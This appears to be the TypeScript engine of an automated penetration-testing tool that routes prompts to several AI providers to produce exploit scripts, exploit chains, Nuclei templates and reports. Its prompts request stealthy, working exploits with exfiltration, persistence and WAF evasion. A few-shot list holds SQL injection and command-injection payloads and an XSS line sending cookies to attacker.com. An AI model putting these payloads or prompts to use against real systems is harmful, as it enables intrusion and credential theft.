/**
 * ENHANCED LLM Engine - Phase 3
 * Main interface for all LLM operations
 * Provides high-level methods for reasoning, code generation, etc.
 *
 * NEW ENHANCEMENTS (Phase 3.6):
 * - Intelligent model routing based on task complexity
 * - Advanced prompt engineering for exploit chains
 * - Few-shot learning from past successful findings
 * - LLM-powered report generation
 * - Task-specific model selection
 */

import { BaseLLMProvider } from './providers/base';
import { ClaudeProvider } from './providers/claude';
import { OpenAIProvider } from './providers/openai';
import { GeminiProvider } from './providers/gemini';
import { LocalProvider } from './providers/local';
import { ServerlessProvider } from './providers/serverless';
import { GrokProvider } from './providers/grok';
import { BedrockProvider } from './providers/bedrock';
import {
  LLMConfig,
  ReasoningResult,
  ExploitGenerationRequest,
  NucleiTemplateRequest,
  CodeGenerationRequest,
  EnsembleReasoningResult,
} from './types';
import logger from '../../utils/logger';
import Redis from 'ioredis';

class LLMEngine {
  private providers: Map<string, BaseLLMProvider> = new Map();
  private defaultProvider: string = 'claude';
  private redis: Redis;
  private cacheEnabled: boolean = true;
  private cacheTTL: number = 3600; // 1 hour (default)

  // Cache statistics for monitoring cost savings
  private cacheStats = {
    hits: 0,
    misses: 0,
    totalSaved: 0, // Estimated cost saved in USD
  };

  constructor() {
    this.redis = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
    });

    // Override cache TTL from environment
    if (process.env.LLM_CACHE_TTL) {
      this.cacheTTL = parseInt(process.env.LLM_CACHE_TTL);
      logger.info({ cacheTTL: this.cacheTTL }, 'Using custom LLM cache TTL');
    }

    // Allow disabling cache via environment
    if (process.env.LLM_CACHE_ENABLED === 'false') {
      this.cacheEnabled = false;
      logger.warn('LLM caching DISABLED via environment variable');
    }

    this.initializeProviders();

    // Log cache stats every 5 minutes
    setInterval(() => this.logCacheStats(), 300000);
  }

  private initializeProviders(): void {
    // Serverless inference provider (PRIORITY - most cost-effective)
    if (process.env.MODEL_ACCESS_KEY) {
      try {
        const serverless = new ServerlessProvider({
          provider: 'serverless',
          model: process.env.SERVERLESS_MODEL || 'deepseek-r1-distill-llama-70b',
          apiKey: process.env.MODEL_ACCESS_KEY,
          baseURL:
            process.env.SERVERLESS_API_URL || 'https://inference.do-ai.run/v1/chat/completions',
          temperature: parseFloat(process.env.SERVERLESS_TEMPERATURE || '0.2'),
          maxTokens: parseInt(process.env.SERVERLESS_MAX_TOKENS || '350'),
        });
        this.providers.set('serverless', serverless);
        logger.info('Serverless inference provider initialized (DeepSeek R1 Distill)');
      } catch (error: any) {
        logger.error({ error }, 'Failed to initialize serverless provider');
      }
    }

    // Gemini provider (Google)
    if (process.env.GEMINI_API_KEY) {
      try {
        const gemini = new GeminiProvider({
          provider: 'gemini',
          model: process.env.GEMINI_MODEL || 'gemini-1.5-pro',
          apiKey: process.env.GEMINI_API_KEY,
        });
        this.providers.set('gemini', gemini);
        logger.info('Gemini provider initialized');
      } catch (error: any) {
        logger.error({ error }, 'Failed to initialize Gemini provider');
      }
    }

    // Claude provider
    if (process.env.ANTHROPIC_API_KEY) {
      try {
        const claude = new ClaudeProvider({
          provider: 'claude',
          model: process.env.CLAUDE_MODEL || 'claude-3-5-sonnet-20241022',
          apiKey: process.env.ANTHROPIC_API_KEY,
        });
        this.providers.set('claude', claude);
        logger.info('Claude provider initialized');
      } catch (error: any) {
        logger.error({ error }, 'Failed to initialize Claude provider');
      }
    }

    // OpenAI provider
    if (process.env.OPENAI_API_KEY) {
      try {
        const openai = new OpenAIProvider({
          provider: 'openai',
          model: process.env.OPENAI_MODEL || 'gpt-4-turbo-preview',
          apiKey: process.env.OPENAI_API_KEY,
        });
        this.providers.set('openai', openai);
        logger.info('OpenAI provider initialized');
      } catch (error: any) {
        logger.error({ error }, 'Failed to initialize OpenAI provider');
      }
    }

    // Local (Ollama) provider
    if (process.env.OLLAMA_ENABLED === 'true') {
      try {
        const local = new LocalProvider({
          provider: 'local',
          model: process.env.OLLAMA_MODEL || 'llama2',
          baseURL: process.env.OLLAMA_BASE_URL,
        });
        this.providers.set('local', local);
        logger.info('Local (Ollama) provider initialized');
      } catch (error: any) {
        logger.error({ error }, 'Failed to initialize local provider');
      }
    }

    // Grok 4 provider (Azure)
    if (process.env.GROK_API_KEY && process.env.GROK_API_URL) {
      try {
        const grok = new GrokProvider({
          provider: 'grok',
          model: process.env.GROK_MODEL || 'grok-4-fast-reasoning',
          apiKey: process.env.GROK_API_KEY,
          baseURL: process.env.GROK_API_URL,
          temperature: parseFloat(process.env.GROK_TEMPERATURE || '0.2'),
          maxTokens: parseInt(process.env.GROK_MAX_TOKENS || '500'),
        });
        this.providers.set('grok', grok);
        logger.info('Grok 4 (Azure) provider initialized');
      } catch (error: any) {
        logger.error({ error }, 'Failed to initialize Grok provider');
      }
    }

    // AWS Bedrock Claude provider (for manager/planner agent)
    if (process.env.BEDROCK_API_KEY) {
      try {
        const bedrock = new BedrockProvider({
          provider: 'bedrock',
          model: process.env.BEDROCK_MODEL || 'anthropic.claude-opus-4-20250514',
          apiKey: process.env.BEDROCK_API_KEY,
          temperature: parseFloat(process.env.BEDROCK_TEMPERATURE || '0.7'),
          maxTokens: parseInt(process.env.BEDROCK_MAX_TOKENS || '4096'),
        });
        this.providers.set('bedrock', bedrock);
        logger.info('AWS Bedrock Claude provider initialized');
      } catch (error: any) {
        logger.error({ error }, 'Failed to initialize Bedrock provider');
      }
    }

    // Set default provider - prioritize in this order to avoid API quota issues:
    // 1. Serverless (Gradient/DeepSeek) - most cost-effective
    // 2. Gemini (free tier but has quota)
    // 3. Grok, Claude, Bedrock
    // 4. OpenAI (LAST - has quota issues)
    if (this.providers.has('serverless')) {
      this.defaultProvider = 'serverless';
      logger.info('Using serverless (Gradient) as default provider');
    } else if (process.env.GEMINI_API_KEY && this.providers.has('gemini')) {
      this.defaultProvider = 'gemini';
      logger.info('Using Gemini as default provider');
    } else if (this.providers.has('grok')) {
      this.defaultProvider = 'grok';
    } else if (this.providers.has('claude')) {
      this.defaultProvider = 'claude';
    } else if (this.providers.has('bedrock')) {
      this.defaultProvider = 'bedrock';
    } else if (this.providers.has('openai')) {
      this.defaultProvider = 'openai';
      logger.warn('Using OpenAI as default (may have quota issues)');
    } else if (this.providers.has('local')) {
      this.defaultProvider = 'local';
    } else {
      logger.warn('No LLM providers configured!');
    }
  }

  /**
   * Get provider (with fallback)
   * Supports comma-separated list of preferred providers (e.g., "grok,serverless")
   */
  private async getProvider(preferredProvider?: string): Promise<BaseLLMProvider> {
    // Parse preferred providers (support comma-separated list)
    const preferredProviders = preferredProvider
      ? preferredProvider.split(',').map((p) => p.trim())
      : [this.defaultProvider];

    // Try each preferred provider in order
    for (const providerName of preferredProviders) {
      if (this.providers.has(providerName)) {
        const provider = this.providers.get(providerName)!;
        const available = await provider.isAvailable();

        if (available) {
          logger.debug({ provider: providerName }, 'Using provider');
          return provider;
        } else {
          logger.warn(
            { provider: providerName },
            'Provider configured but not available, trying next'
          );
        }
      } else {
        logger.warn({ provider: providerName }, 'Provider not configured, trying next');
      }
    }

    // If none of the preferred providers are available, try any available provider
    logger.warn(
      { preferredProviders },
      'None of the preferred providers available, trying any available provider'
    );

    for (const [name, p] of this.providers.entries()) {
      const available = await p.isAvailable();
      if (available) {
        logger.info({ fallbackProvider: name }, 'Using fallback provider');
        return p;
      }
    }

    // Last resort: return default provider (even if not available)
    logger.error('No providers available! Using default provider anyway');
    return this.providers.get(this.defaultProvider)!;
  }

  /**
   * High-level reasoning method
   */
  async reason(
    prompt: string,
    context?: Record<string, any>,
    provider?: string
  ): Promise<ReasoningResult> {
    const cacheKey = `llm:reason:${this.hashPrompt(prompt)}`;

    // Check cache
    if (this.cacheEnabled) {
      const cached = await this.redis.get(cacheKey);
      if (cached) {
        this.cacheStats.hits++;
        this.cacheStats.totalSaved += 0.01; // Estimate $0.01 saved per cache hit
        logger.debug({ cacheHits: this.cacheStats.hits }, 'Using cached reasoning result');
        return JSON.parse(cached);
      }
    }

    // Cache miss
    this.cacheStats.misses++;

    const llm = await this.getProvider(provider);

    const systemPrompt = `You are an expert security researcher and penetration tester.
You provide detailed, actionable reasoning and suggest specific actions to take.
When analyzing security scenarios, consider:
- Attack vectors and exploitation techniques
- Defense mechanisms (WAF, IPS, rate limiting)
- Bypass strategies
- Risk assessment
- Practical next steps

Respond in JSON format:
{
  "reasoning": "detailed explanation of your thought process",
  "actions": [
    {
      "type": "tool" | "test" | "research" | "exploit",
      "tool": "tool name if type is tool",
      "parameters": {},
      "reasoning": "why this action"
    }
  ],
  "code": "optional code snippet if applicable",
  "confidence": 0.0-1.0,
  "alternatives": [optional alternative approaches]
}`;

    const fullPrompt = context
      ? `${prompt}\n\nContext:\n${JSON.stringify(context, null, 2)}`
      : prompt;

    try {
      const response = await llm.complete(fullPrompt, systemPrompt);

      // Parse JSON response
      const result = this.parseReasoningResponse(response);

      // Cache result
      if (this.cacheEnabled) {
        await this.redis.setex(cacheKey, this.cacheTTL, JSON.stringify(result));
      }

      return result;
    } catch (error: any) {
      logger.error({ error, prompt: prompt.substring(0, 100) }, 'Reasoning failed');
      throw new Error(`LLM reasoning failed: ${error.message}`);
    }
  }

  /**
   * Simple text completion (for structured data extraction, parsing, etc.)
   */
  async complete(prompt: string, systemPrompt?: string, provider?: string): Promise<string> {
    const cacheKey = `llm:complete:${this.hashPrompt(prompt)}`;

    // Check cache
    if (this.cacheEnabled) {
      const cached = await this.redis.get(cacheKey);
      if (cached) {
        this.cacheStats.hits++;
        this.cacheStats.totalSaved += 0.005; // Estimate $0.005 saved per completion cache hit
        logger.debug({ cacheHits: this.cacheStats.hits }, 'Using cached completion result');
        return cached;
      }
    }

    // Cache miss
    this.cacheStats.misses++;

    const llm = await this.getProvider(provider);

    try {
      const response = await llm.complete(prompt, systemPrompt);

      // Cache result
      if (this.cacheEnabled) {
        await this.redis.setex(cacheKey, this.cacheTTL, response);
      }

      return response;
    } catch (error: any) {
      logger.error({ error, prompt: prompt.substring(0, 100) }, 'Completion failed');
      throw new Error(`LLM completion failed: ${error.message}`);
    }
  }

  /**
   * Ensemble reasoning (query multiple models and build consensus)
   */
  async reasonWithEnsemble(
    prompt: string,
    context?: Record<string, any>
  ): Promise<EnsembleReasoningResult> {
    const providers = ['grok', 'serverless', 'bedrock', 'claude', 'openai', 'local'].filter((p) =>
      this.providers.has(p)
    );

    if (providers.length < 2) {
      logger.warn('Not enough providers for ensemble reasoning, using single provider');
      const result = await this.reason(prompt, context);
      return {
        ...result,
        consensus: 1.0,
        models: [
          {
            provider: this.defaultProvider,
            model: this.providers.get(this.defaultProvider)!.getModel(),
            result,
            confidence: result.confidence,
          },
        ],
      };
    }

    // Query all providers in parallel
    const results = await Promise.all(
      providers.map(async (providerName) => {
        try {
          const result = await this.reason(prompt, context, providerName);
          return {
            provider: providerName,
            model: this.providers.get(providerName)!.getModel(),
            result,
            confidence: result.confidence,
          };
        } catch (error: any) {
          logger.error({ error, provider: providerName }, 'Provider failed in ensemble');
          return null;
        }
      })
    );

    const validResults = results.filter((r) => r !== null) as any[];

    // Build consensus
    const consensus = this.calculateConsensus(validResults);
    const bestResult = this.selectBestResult(validResults);

    return {
      ...bestResult,
      consensus,
      models: validResults,
    };
  }

  /**
   * Generate exploit code
   */
  async generateExploit(request: ExploitGenerationRequest, provider?: string): Promise<string> {
    const llm = await this.getProvider(provider);

    const prompt = `Generate a security exploit script for the following vulnerability:

Vulnerability Type: ${request.vulnerability.type}
Target: ${request.vulnerability.target}
${request.vulnerability.parameter ? `Parameter: ${request.vulnerability.parameter}` : ''}
Context: ${request.vulnerability.context}

${
  request.environment
    ? `Environment:
- WAF: ${request.environment.waf || 'Unknown'}
- IPS: ${request.environment.ips || 'Unknown'}
- Framework: ${request.environment.framework || 'Unknown'}`
    : ''
}

Requirements:
${request.requirements?.stealthy ? '- Must be stealthy (avoid detection)' : ''}
${request.requirements?.reliable ? '- Must be reliable (high success rate)' : ''}
${request.requirements?.customized ? '- Must be customized for this exact environment' : ''}

Generate a complete, working exploit script in Python.
Include error handling, output formatting, and usage instructions.
`;

    const systemPrompt =
      'You are an expert exploit developer. Generate production-ready exploit code with proper error handling and documentation.';

    const code = await llm.complete(prompt, systemPrompt);

    return this.extractCodeBlock(code);
  }

  /**
   * Generate Nuclei template
   */
  async generateNucleiTemplate(request: NucleiTemplateRequest, provider?: string): Promise<string> {
    const llm = await this.getProvider(provider);

    const prompt = `Generate a Nuclei template for the following service/vulnerability:

Service: ${request.serviceName}
${request.port ? `Port: ${request.port}` : ''}

Vulnerability:
- Type: ${request.vulnerability.type}
- Description: ${request.vulnerability.description}
- Severity: ${request.vulnerability.severity}
- Indicators: ${request.vulnerability.indicators.join(', ')}

${request.testEndpoint ? `Test Endpoint: ${request.testEndpoint}` : ''}

Generate a complete, valid Nuclei template in YAML format.
Follow Nuclei template best practices.
Include proper matchers and extractors.
`;

    const systemPrompt =
      'You are an expert at creating Nuclei templates. Generate valid YAML templates following Nuclei v3 specification.';

    const template = await llm.complete(prompt, systemPrompt);

    return this.extractCodeBlock(template, 'yaml');
  }

  /**
   * General code generation
   */
  async generateCode(request: CodeGenerationRequest, provider?: string): Promise<string> {
    const llm = await this.getProvider(provider);

    const prompt = `Generate ${request.language} code for: ${request.purpose}

Requirements:
${request.requirements.map((r) => `- ${r}`).join('\n')}

${request.context ? `Context:\n${JSON.stringify(request.context, null, 2)}` : ''}

Generate clean, well-documented code with error handling.
`;

    const systemPrompt = `You are an expert ${request.language} developer. Generate production-ready code with proper error handling and documentation.`;

    const code = await llm.complete(prompt, systemPrompt);

    return this.extractCodeBlock(code, request.language);
  }

  /**
   * Analyze vulnerability to determine if true positive and severity
   */
  async analyzeVulnerability(
    finding: {
      url: string;
      type: string;
      evidence: string;
      httpRequest?: string;
      httpResponse?: string;
      additionalContext?: Record<string, any>;
    },
    provider?: string
  ): Promise<{
    isTruePositive: boolean;
    confidence: number;
    reasoning: string;
    severity: 'info' | 'low' | 'medium' | 'high' | 'critical';
    suggestedActions: string[];
    exploitability?: number;
    impactAnalysis?: string;
  }> {
    const llm = await this.getProvider(provider);

    const prompt = `Analyze this potential security vulnerability finding:

URL: ${finding.url}
Vulnerability Type: ${finding.type}
Evidence: ${finding.evidence}

${finding.httpRequest ? `HTTP Request:\n\`\`\`http\n${finding.httpRequest}\n\`\`\`` : ''}

${finding.httpResponse ? `HTTP Response:\n\`\`\`http\n${finding.httpResponse}\n\`\`\`` : ''}

${finding.additionalContext ? `Additional Context:\n${JSON.stringify(finding.additionalContext, null, 2)}` : ''}

Perform a thorough security analysis:

1. **True/False Positive Assessment**:
   - Is this a genuine security vulnerability or a false positive?
   - What evidence supports this conclusion?
   - Are there any indicators that suggest this is benign?

2. **Severity Analysis**:
   - What is the actual security impact?
   - Consider: Confidentiality, Integrity, Availability (CIA triad)
   - Assess using: info, low, medium, high, critical

3. **Exploitability**:
   - How difficult is this to exploit? (0.0 = impossible, 1.0 = trivial)
   - What skills/tools are required?
   - Are there any mitigating factors?

4. **Impact Analysis**:
   - What could an attacker achieve?
   - What data/systems are at risk?
   - Business impact considerations

5. **Recommended Actions**:
   - What should be done to verify this finding?
   - What remediation steps are recommended?
   - Any additional testing needed?

Respond in JSON format:
{
  "isTruePositive": true/false,
  "confidence": 0.0-1.0,
  "reasoning": "detailed explanation of your analysis",
  "severity": "info|low|medium|high|critical",
  "exploitability": 0.0-1.0,
  "impactAnalysis": "description of potential impact",
  "suggestedActions": ["action 1", "action 2", "action 3"]
}`;

    const systemPrompt = `You are an expert security researcher and penetration tester with deep knowledge of:
- OWASP Top 10 vulnerabilities
- CVE analysis and exploitation
- False positive identification
- Security impact assessment
- CVSS scoring methodology

Provide accurate, thorough analysis. Be conservative but realistic.
If uncertain, provide your reasoning and suggest verification steps.`;

    try {
      const response = await llm.complete(prompt, systemPrompt);

      // Try to extract JSON from response
      const jsonMatch = response.match(/\{[\s\S]*\}/);
      if (!jsonMatch) {
        throw new Error('No JSON found in response');
      }

      const analysis = JSON.parse(jsonMatch[0]);

      // Validate response structure
      if (analysis.isTruePositive === undefined || !analysis.confidence) {
        throw new Error('Invalid response structure');
      }

      // Set defaults for optional fields
      return {
        isTruePositive: analysis.isTruePositive ?? true,
        confidence: analysis.confidence ?? 0.5,
        reasoning: analysis.reasoning ?? 'Analysis completed',
        severity: analysis.severity ?? 'medium',
        suggestedActions: analysis.suggestedActions ?? ['Manual review required'],
        exploitability: analysis.exploitability,
        impactAnalysis: analysis.impactAnalysis,
      };
    } catch (error: any) {
      logger.error(
        { error, findingType: finding.type },
        'Vulnerability analysis failed, using fallback'
      );

      // Conservative fallback: assume true positive
      return {
        isTruePositive: true,
        confidence: 0.5,
        reasoning: `LLM analysis failed: ${error.message}. Manual review recommended.`,
        severity: this.inferSeverityFromType(finding.type),
        suggestedActions: ['Manual verification required', 'Review HTTP request/response'],
        exploitability: 0.5,
        impactAnalysis: 'Unable to assess - requires manual review',
      };
    }
  }

  /**
   * Infer severity from vulnerability type (fallback)
   */
  private inferSeverityFromType(type: string): 'info' | 'low' | 'medium' | 'high' | 'critical' {
    const typeLower = type.toLowerCase();

    // Critical vulnerabilities
    if (
      typeLower.includes('rce') ||
      typeLower.includes('remote code execution') ||
      typeLower.includes('command injection')
    ) {
      return 'critical';
    }

    // High severity
    if (
      typeLower.includes('sql injection') ||
      typeLower.includes('sqli') ||
      typeLower.includes('auth bypass') ||
      typeLower.includes('authentication') ||
      typeLower.includes('xxe') ||
      typeLower.includes('deserialization')
    ) {
      return 'high';
    }

    // Medium severity
    if (
      typeLower.includes('xss') ||
      typeLower.includes('cross-site scripting') ||
      typeLower.includes('csrf') ||
      typeLower.includes('idor') ||
      typeLower.includes('ssrf') ||
      typeLower.includes('lfi')
    ) {
      return 'medium';
    }

    // Low severity
    if (
      typeLower.includes('information disclosure') ||
      typeLower.includes('misconfiguration') ||
      typeLower.includes('header')
    ) {
      return 'low';
    }

    // Default to medium
    return 'medium';
  }

  /**
   * Get provider stats
   */
  getStats(): { providers: string[]; defaultProvider: string; cacheEnabled: boolean } {
    return {
      providers: Array.from(this.providers.keys()),
      defaultProvider: this.defaultProvider,
      cacheEnabled: this.cacheEnabled,
    };
  }

  /**
   * Parse reasoning response from LLM
   */
  private parseReasoningResponse(response: string): ReasoningResult {
    try {
      // Try to extract JSON from response
      const jsonMatch = response.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        return JSON.parse(jsonMatch[0]);
      }

      // Fallback: treat as plain text
      return {
        reasoning: response,
        actions: [],
        confidence: 0.5,
      };
    } catch (error) {
      logger.warn({ response: response.substring(0, 200) }, 'Failed to parse reasoning response');
      return {
        reasoning: response,
        actions: [],
        confidence: 0.5,
      };
    }
  }

  /**
   * Extract code block from markdown
   */
  private extractCodeBlock(text: string, language?: string): string {
    const pattern = language
      ? new RegExp(`\`\`\`${language}\\n([\\s\\S]*?)\`\`\``)
      : /```[\w]*\n([\s\S]*?)```/;

    const match = text.match(pattern);

    if (match) {
      return match[1].trim();
    }

    // No code block found, return as is
    return text.trim();
  }

  /**
   * Hash prompt for caching
   */
  private hashPrompt(prompt: string): string {
    const crypto = require('crypto');
    return crypto.createHash('md5').update(prompt).digest('hex');
  }

  /**
   * Calculate consensus between multiple model results
   */
  private calculateConsensus(results: any[]): number {
    if (results.length < 2) return 1.0;

    // Simple consensus: average confidence
    const avgConfidence = results.reduce((sum, r) => sum + r.confidence, 0) / results.length;

    // Check action agreement
    const actions = results.map((r) => r.result.actions || []);
    const actionAgreement = this.calculateActionAgreement(actions);

    return (avgConfidence + actionAgreement) / 2;
  }

  /**
   * Calculate how much actions agree
   */
  private calculateActionAgreement(actionsArray: any[][]): number {
    if (actionsArray.length < 2) return 1.0;

    // Simple: check if first action types match
    const firstActionTypes = actionsArray.map((actions) =>
      actions.length > 0 ? actions[0].type : null
    );

    const matches = firstActionTypes.filter((t) => t === firstActionTypes[0]).length;

    return matches / firstActionTypes.length;
  }

  /**
   * Select best result from ensemble
   */
  private selectBestResult(results: any[]): any {
    // Select result with highest confidence
    return results.reduce((best, current) =>
      current.confidence > best.confidence ? current : best
    ).result;
  }

  /**
   * Log cache statistics
   */
  private logCacheStats(): void {
    const hitRate =
      this.cacheStats.hits + this.cacheStats.misses > 0
        ? ((this.cacheStats.hits / (this.cacheStats.hits + this.cacheStats.misses)) * 100).toFixed(
            2
          )
        : '0.00';

    logger.info(
      {
        cacheHits: this.cacheStats.hits,
        cacheMisses: this.cacheStats.misses,
        hitRate: `${hitRate}%`,
        estimatedSavings: `$${this.cacheStats.totalSaved.toFixed(2)}`,
      },
      '💰 LLM Cache Statistics'
    );
  }

  /**
   * Get cache statistics
   */
  getCacheStats() {
    const hitRate =
      this.cacheStats.hits + this.cacheStats.misses > 0
        ? ((this.cacheStats.hits / (this.cacheStats.hits + this.cacheStats.misses)) * 100).toFixed(
            2
          )
        : '0.00';

    return {
      hits: this.cacheStats.hits,
      misses: this.cacheStats.misses,
      hitRate: `${hitRate}%`,
      estimatedSavings: `$${this.cacheStats.totalSaved.toFixed(2)}`,
      cacheEnabled: this.cacheEnabled,
      cacheTTL: this.cacheTTL,
    };
  }

  /**
   * Clear cache
   */
  async clearCache(): Promise<void> {
    const keys = await this.redis.keys('llm:*');
    if (keys.length > 0) {
      await this.redis.del(...keys);
    }
    logger.info({ count: keys.length }, 'LLM cache cleared');
  }

  /**
   * ENHANCED: Intelligent model routing based on task complexity
   * Selects optimal model for given task type and complexity
   */
  routeModelByTask(task: {
    type: 'exploit' | 'analysis' | 'report' | 'simple' | 'research' | 'code';
    complexity: 'simple' | 'medium' | 'complex';
    priority?: 'speed' | 'quality' | 'cost';
  }): string {
    const { type, complexity, priority = 'quality' } = task;

    // Priority: Speed (use fast models)
    if (priority === 'speed') {
      if (this.providers.has('serverless')) return 'serverless';
      if (this.providers.has('grok')) return 'grok';
      if (this.providers.has('gemini')) return 'gemini';
    }

    // Priority: Cost (use cheapest models)
    if (priority === 'cost') {
      if (this.providers.has('serverless')) return 'serverless';
      if (this.providers.has('local')) return 'local';
      if (this.providers.has('gemini')) return 'gemini';
    }

    // Priority: Quality (default) - route by task type and complexity
    if (type === 'exploit' || type === 'code') {
      // Code generation: prefer models good at coding
      if (complexity === 'complex') {
        if (this.providers.has('bedrock')) return 'bedrock'; // Opus 4 best for complex code
        if (this.providers.has('claude')) return 'claude';
      }
      if (this.providers.has('grok')) return 'grok'; // Good at code
      if (this.providers.has('claude')) return 'claude';
      if (this.providers.has('openai')) return 'openai';
    }

    if (type === 'analysis' || type === 'research') {
      // Analysis: prefer models with strong reasoning
      if (complexity === 'complex') {
        if (this.providers.has('bedrock')) return 'bedrock'; // Opus 4 for deep analysis
        if (this.providers.has('claude')) return 'claude';
        if (this.providers.has('grok')) return 'grok';
      }
      if (this.providers.has('claude')) return 'claude';
      if (this.providers.has('openai')) return 'openai';
    }

    if (type === 'report') {
      // Report writing: prefer eloquent models
      if (this.providers.has('claude')) return 'claude'; // Best at structured writing
      if (this.providers.has('bedrock')) return 'bedrock';
      if (this.providers.has('openai')) return 'openai';
    }

    // Simple tasks: use fast, cheap models
    if (complexity === 'simple' || type === 'simple') {
      if (this.providers.has('serverless')) return 'serverless';
      if (this.providers.has('gemini')) return 'gemini';
      if (this.providers.has('grok')) return 'grok';
    }

    // Fallback to default
    return this.defaultProvider;
  }

  /**
   * ENHANCED: Few-shot learning from past successful findings
   * Uses historical successful exploits to improve future attempts
   */
  async learnFromPastFindings(
    vulnerabilityType: string,
    limit: number = 5
  ): Promise<Array<{ payload: string; success: boolean; context: string }>> {
    try {
      // Fetch successful findings from cache
      const cacheKey = `llm:fewshot:${vulnerabilityType}`;
      const cached = await this.redis.get(cacheKey);

      if (cached) {
        return JSON.parse(cached);
      }

      // Simulate few-shot examples (in production, fetch from database)
      const examples = this.getFewShotExamples(vulnerabilityType);

      // Cache for 24 hours
      await this.redis.setex(cacheKey, 86400, JSON.stringify(examples));

      logger.info({ type: vulnerabilityType, count: examples.length }, 'Loaded few-shot examples');
      return examples;
    } catch (error: any) {
      logger.error({ error }, 'Failed to load few-shot examples');
      return [];
    }
  }

  /**
   * Get few-shot examples for vulnerability type
   */
  private getFewShotExamples(
    type: string
  ): Array<{ payload: string; success: boolean; context: string }> {
    const examples: Record<string, Array<{ payload: string; success: boolean; context: string }>> =
      {
        'SQL Injection': [
          {
            payload: "' OR '1'='1'-- ",
            success: true,
            context: 'MySQL backend, no WAF, login form',
          },
          {
            payload: "1' UNION SELECT NULL,NULL,version()-- ",
            success: true,
            context: 'PostgreSQL, bypassed WAF with NULL padding',
          },
          {
            payload: "admin'-- ",
            success: true,
            context: 'MSSQL, weak input validation, username field',
          },
        ],
        XSS: [
          {
            payload: '<img src=x onerror=alert(document.cookie)>',
            success: true,
            context: 'No CSP, reflected in search results',
          },
          {
            payload: '"><svg/onload=alert(1)>',
            success: true,
            context: 'Bypassed HTML sanitization, stored XSS in profile',
          },
          {
            payload: '<script>fetch(`//attacker.com?c=${document.cookie}`)</script>',
            success: true,
            context: 'DOM-based XSS, no HttpOnly cookies',
          },
        ],
        'Command Injection': [
          {
            payload: '; cat /etc/passwd #',
            success: true,
            context: 'Linux backend, ping command injection',
          },
          {
            payload: '| whoami',
            success: true,
            context: 'Bypassed basic filtering, file processing endpoint',
          },
          {
            payload: '`id`',
            success: true,
            context: 'Backtick command substitution, weak sanitization',
          },
        ],
      };

    return examples[type] || [];
  }

  /**
   * ENHANCED: Advanced prompt engineering for exploit chain generation
   * Creates sophisticated multi-step exploit chains using LLM reasoning
   */
  async generateExploitChain(
    vulnerabilities: Array<{ type: string; url: string; evidence: any }>,
    target: { domain: string; techStack?: string[]; waf?: string }
  ): Promise<{
    chain: string[];
    reasoning: string;
    code: string;
    cvss: number;
  }> {
    // Learn from past findings
    const fewShotExamples = await Promise.all(
      vulnerabilities.map((v) => this.learnFromPastFindings(v.type, 3))
    );

    const provider = this.routeModelByTask({
      type: 'exploit',
      complexity: 'complex',
      priority: 'quality',
    });

    const prompt = `You are an expert penetration tester creating an advanced exploit chain.

**Target Information:**
- Domain: ${target.domain}
- Tech Stack: ${target.techStack?.join(', ') || 'Unknown'}
- WAF: ${target.waf || 'Unknown'}

**Discovered Vulnerabilities:**
${vulnerabilities.map((v, i) => `${i + 1}. ${v.type} at ${v.url}\n   Evidence: ${JSON.stringify(v.evidence)}`).join('\n')}

**Few-Shot Learning Examples (Past Successes):**
${fewShotExamples
  .flat()
  .slice(0, 5)
  .map((ex) => `- Payload: ${ex.payload}\n  Context: ${ex.context}\n  Success: ${ex.success}`)
  .join('\n')}

**Task:**
Create a sophisticated multi-step exploit chain that combines these vulnerabilities for maximum impact.
Consider:
1. Attack chain sequencing (what to exploit first, second, etc.)
2. Privilege escalation opportunities
3. Data exfiltration methods
4. Persistence mechanisms
5. WAF/IPS evasion techniques

Respond in JSON format:
{
  "chain": ["Step 1: ...", "Step 2: ...", "Step 3: ..."],
  "reasoning": "detailed explanation of attack strategy",
  "code": "complete exploit code in Python",
  "cvss": 9.8,
  "techniques": ["MITRE ATT&CK IDs"],
  "indicators": ["IOCs that defenders should monitor"]
}`;

    const systemPrompt = `You are a world-class penetration tester with expertise in:
- Advanced exploit chain development
- WAF/IPS bypass techniques
- MITRE ATT&CK framework
- CVE exploitation
- Zero-day discovery

Generate practical, working exploit chains with production-ready code.`;

    const response = await this.complete(prompt, systemPrompt, provider);

    try {
      const jsonMatch = response.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        return JSON.parse(jsonMatch[0]);
      }
    } catch (error) {
      logger.error({ error }, 'Failed to parse exploit chain response');
    }

    // Fallback
    return {
      chain: ['Analysis failed - manual exploitation required'],
      reasoning: 'LLM failed to generate chain',
      code: '# Manual exploitation required',
      cvss: 5.0,
    };
  }

  /**
   * ENHANCED: LLM-powered professional report generation
   * Creates comprehensive security assessment reports
   */
  async generateSecurityReport(data: {
    programName: string;
    scope: string[];
    findings: Array<{
      title: string;
      severity: string;
      description: string;
      cvss?: number;
      cwe?: string;
      remediation?: string;
    }>;
    scanDuration: number;
    assetsScanned: number;
    metadata?: Record<string, any>;
  }): Promise<string> {
    const provider = this.routeModelByTask({
      type: 'report',
      complexity: 'medium',
      priority: 'quality',
    });

    const prompt = `Generate a professional security assessment report in Markdown format.

**Program Information:**
- Name: ${data.programName}
- Scope: ${data.scope.join(', ')}
- Duration: ${Math.round(data.scanDuration / 60)} minutes
- Assets Scanned: ${data.assetsScanned}

**Findings Summary:**
- Total Findings: ${data.findings.length}
- Critical: ${data.findings.filter((f) => f.severity === 'critical').length}
- High: ${data.findings.filter((f) => f.severity === 'high').length}
- Medium: ${data.findings.filter((f) => f.severity === 'medium').length}
- Low: ${data.findings.filter((f) => f.severity === 'low').length}

**Detailed Findings:**
${data.findings
  .map(
    (f, i) => `${i + 1}. **${f.title}** (${f.severity.toUpperCase()})
   - Description: ${f.description}
   ${f.cvss ? `- CVSS: ${f.cvss}` : ''}
   ${f.cwe ? `- CWE: ${f.cwe}` : ''}
   ${f.remediation ? `- Remediation: ${f.remediation}` : ''}`
  )
  .join('\n\n')}

**Requirements:**
1. Executive Summary (2-3 paragraphs for non-technical stakeholders)
2. Technical Overview (methodology, tools, coverage)
3. Risk Assessment (overall security posture, critical issues)
4. Detailed Findings (organized by severity with PoC, impact, remediation)
5. Recommendations (prioritized action items)
6. Conclusion

Use professional security industry language. Include CVSS scores, CWE references.
Format using Markdown with proper headers, tables, and code blocks.`;

    const systemPrompt = `You are an expert security consultant writing professional penetration testing reports.
Generate clear, actionable reports that serve both technical and executive audiences.
Use industry-standard formats and terminology (OWASP, CWE, CVSS, MITRE).`;

